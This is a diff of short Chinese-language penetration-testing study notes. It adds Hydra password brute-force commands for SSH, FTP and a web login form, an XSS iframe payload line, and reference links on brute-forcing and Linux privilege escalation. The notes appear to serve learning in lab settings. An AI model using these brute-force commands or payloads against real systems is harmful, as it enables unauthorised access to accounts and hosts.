@@ -41,14 +41,16 @@ DNS 子網域爆破 -> 尋找目標企業可能遺忘或未受保護的子網域
 - <iframe src="javascript:alert(1)"></iframe>
 
 3. Hydra -> /usr/share/wordlists
-(1) SSH
+- SSH
 hydra -l root -P passwords.txt 192.168.1.1 ssh
-(2) FTP
+- FTP
 hydra -L users.txt -P passwords.txt -t 4 192.168.1.50 ftp
-(3) 網頁表單
+- 網頁表單
 hydra -l admin -P pass.txt 192.168.1.100 http-post-form "/login.php:user=^USER^&pass=^PASS^:Login failed"
+https://minmin0625.medium.com/%E6%BB%B2%E9%80%8F%E6%B8%AC%E8%A9%A6lab-%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8hydra-nmap-%E5%9F%B7%E8%A1%8C%E9%81%A0%E7%AB%AF%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3-a21d9b8149e0
+https://ithelp.ithome.com.tw/m/articles/10321942
 
-Linux 提權
+- Linux 提權
 https://swisskyrepo.github.io/InternalAllTheThings/redteam/escalation/linux-privilege-escalation/#nopasswd
 
 
